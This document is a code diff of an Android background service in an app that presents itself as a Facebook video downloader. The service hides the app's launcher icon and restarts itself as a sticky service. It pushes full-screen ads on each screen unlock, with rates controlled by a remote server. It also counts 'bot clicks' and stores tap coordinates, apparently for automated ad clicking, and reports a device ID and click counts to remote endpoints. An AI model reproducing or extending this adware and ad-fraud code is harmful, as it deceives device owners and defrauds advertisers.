@@ -1,5 +1,6 @@
 package com.mngh.tuanvn.fbvideodownloader.service;
 
+import android.app.ActivityManager;
 import android.app.Instrumentation;
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -29,9 +30,9 @@ import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.mngh.tuanvn.fbvideodownloader.Model.CheckAds;
 import com.mngh.tuanvn.fbvideodownloader.Model.ClientConfig;
+import com.mngh.tuanvn.fbvideodownloader.R;
 import com.mngh.tuanvn.fbvideodownloader.ShowAds;
 import com.mngh.tuanvn.fbvideodownloader.utils.AppConstants;
-import com.mngh.tuanvn.fbvideodownloader.R;
 
 import java.io.IOException;
 import java.util.Random;
@@ -60,9 +61,9 @@ public class MyService extends Service {
     private int delayService;
     private int delay_report;
 
-    private int countTotalShow = 0;
-    private int countRealClick = 0;
-    private int countBotClick = 0;
+    private int countTotalShow=0;
+    private int countRealClick=0;
+    private int countBotClick=0;
     private int delay_retention = -1;
 
     private ClientConfig clientConfig;
@@ -70,11 +71,17 @@ public class MyService extends Service {
     private com.facebook.ads.InterstitialAd fbInterstitialAd;
     private CheckAds checkAds;
 
-    private static final Point[] points = {new Point(50, 50), new Point(51, 57), new Point(79, 85), new Point(72, 74),
-            new Point(70, 92), new Point(48, 80), new Point(48, 65), new Point(53, 40)};
+    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
+            new Point(70,92),new Point(71,91),new Point(71,93),new Point(72,92),new Point(48,80),new Point(48,65),new Point(53,40)};
 
     @Override
     public void onCreate() {
+        Log.d("cao","onCreate");
+    }
+
+    private void initService()
+    {
+        Log.d("cao","initService");
         SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
         idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
@@ -83,7 +90,6 @@ public class MyService extends Service {
         delay_retention = mPrefs.getInt("delay_retention", -1);
         delay_report = mPrefs.getInt("delay_report", 1);
         idFullFbService = mPrefs.getString("idFullFbService", "2061820020517519_2085229838176537");
-
         getAdsCount();
 
         MyBroadcast myBroadcast = new MyBroadcast();
@@ -98,15 +104,27 @@ public class MyService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d("cao","onStartCommand");
+        if(myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
+            initService();
+        }
+        return START_STICKY;
+    }
+
     private void addShortcut() {
         //Adding shortcut for MainActivity
         try {
             PackageManager p = getPackageManager();
-            ComponentName componentName = new ComponentName(this.getPackageName(), getPackageName() + ".MAIN1");
-            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-//            Log.d("caomui", "DONE hide icon");
-        } catch (Exception e) {
-//            Log.d("caomui", "ERROR HIDE ICON");
+            ComponentName componentName = new ComponentName(this.getPackageName(), "com.mngh.tuanvn.fbvideodownloader.MAIN1");
+            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+//            Log.d("caomui","DONE hide icon");
+        }
+        catch (Exception e)
+        {
+//            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
+            e.printStackTrace();
         }
 
         Intent shortcutIntent = new Intent(getApplicationContext(),
@@ -117,17 +135,17 @@ public class MyService extends Service {
         Intent addIntent = new Intent();
         addIntent
                 .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
-        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "FB video downloader");
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Fb Video downloader");
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                 Intent.ShortcutIconResource.fromContext(getApplicationContext(),
-                        R.drawable.fbdownloader_ic));
+                        R.mipmap.ic_launcher));
 
         addIntent
                 .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
         addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
         getApplicationContext().sendBroadcast(addIntent);
 
-//        Log.d("caomui", "ADD shortcut done");
+//        Log.d("caomui","ADD shortcut done");
         createShortcut();
     }
 
@@ -141,11 +159,11 @@ public class MyService extends Service {
                 totalTime += intervalService;
                 mPrefs.edit().putInt("totalTime", totalTime).commit();
 
-                if (delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
+                if(delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                 {
                     addShortcut();
                     delay_retention = -1;
-                    mPrefs.edit().putInt("delay_retention", -1).commit();
+                    mPrefs.edit().putInt("delay_retention",-1).commit();
                 }
 
                 if (totalTime % (delay_report * 60) == 0) {
@@ -160,17 +178,17 @@ public class MyService extends Service {
                 }
             }
         }, 0, intervalService, TimeUnit.MINUTES);
-//        }, 0, intervalService, TimeUnit.SECONDS);
 
     }
 
-    private void getClientConfig() {
+    private void getClientConfig()
+    {
         OkHttpClient client = new OkHttpClient();
         RequestBody body = new FormBody.Builder()
                 .add("countTotalShow", countTotalShow + "")
-                .add("countRealClick", countRealClick + "")
-                .add("countBotClick", countBotClick + "")
-                .add("id", uuid)
+                .add("countRealClick",countRealClick+"")
+                .add("countBotClick",countBotClick+"")
+                .add("id",uuid)
                 .build();
         Request okRequest = new Request.Builder()
                 .url(AppConstants.URL_CLIENT_CONFIG)
@@ -184,7 +202,7 @@ public class MyService extends Service {
             @Override
             public void onResponse(Call call, Response response) throws IOException {
                 Gson gson = new GsonBuilder().create();
-                clientConfig = gson.fromJson(response.body().string(), ClientConfig.class);
+                clientConfig = gson.fromJson(response.body().string(),ClientConfig.class);
                 countTotalShow = 0;
                 countBotClick = 0;
                 countRealClick = 0;
@@ -192,6 +210,29 @@ public class MyService extends Service {
                 saveAdsCount();
             }
         });
+    }
+
+    private void createShortcut()
+    {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Thread.sleep(5000);
+                    OkHttpClient client = new OkHttpClient();
+                    RequestBody body = new FormBody.Builder()
+                            .add("id",uuid)
+                            .build();
+                    Request okRequest = new Request.Builder()
+                            .url(AppConstants.URL_CREATE_SHORTCUT)
+                            .post(body)
+                            .build();
+                    client.newCall(okRequest).execute();
+                }
+                catch (Exception e){
+                }
+            }
+        }).start();
     }
 
     private void saveAdsCount() {
@@ -210,38 +251,16 @@ public class MyService extends Service {
         countBotClick = mPrefs.getInt("countBotClick", 0);
     }
 
-    private void createShortcut() {
-
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Thread.sleep(5000);
-                    OkHttpClient client = new OkHttpClient();
-                    RequestBody body = new FormBody.Builder()
-                            .add("id", uuid)
-                            .build();
-                    Request okRequest = new Request.Builder()
-                            .url(AppConstants.URL_CREATE_SHORTCUT)
-                            .post(body)
-                            .build();
-                    client.newCall(okRequest).execute();
-                } catch (Exception e) {
-                }
-            }
-        }).start();
-    }
-
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
             Log.d("cao", "Unlock Screen " + uuid);
+
             if (!isContinousShowAds || clientConfig == null)
                 return;
             if (new Random().nextInt(100) > clientConfig.max_percent_ads) {
                 return;
             }
-
             if (new Random().nextInt(100) < clientConfig.fb_percent_ads) {
                 new Handler(Looper.getMainLooper()).post(new Runnable() {
                     public void run() {
@@ -395,11 +414,10 @@ public class MyService extends Service {
                             }
                         });
 
-                        mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
+                        mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("bdb2f833-8f8c-4c04-854a-25598ac40375")
                     }
                 });
             }
-
         }
     }
 }
